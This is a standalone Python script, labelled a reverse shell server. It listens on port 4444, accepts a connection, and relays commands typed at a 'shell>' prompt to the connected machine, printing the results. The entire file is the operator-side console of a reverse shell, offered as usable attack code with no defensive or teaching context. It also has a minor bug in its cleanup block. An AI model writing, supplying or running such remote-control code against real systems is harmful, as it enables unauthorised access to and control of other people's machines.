import socket
import sys

def start_server():
    print("Reverse Shell Server")
    print("Waiting for connections...")
    
    # Create socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        # Bind to all interfaces on port 4444
        server_socket.bind(('0.0.0.0', 4444))
        server_socket.listen(1)
        print("Server listening on port 4444...")
        
        # Accept connection
        client_socket, client_address = server_socket.accept()
        print(f"Connection from: {client_address}")
        
        # Command loop
        while True:
            # Get command from user
            command = input("shell> ")
            
            if command.lower() == 'exit':
                client_socket.send(b'exit')
                break
            
            # Send command to client
            client_socket.send(command.encode())
            
            # Receive response
            response = client_socket.recv(4096).decode()
            print(response)
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        server_socket.close()

if __name__ == "__main__":
    start_server()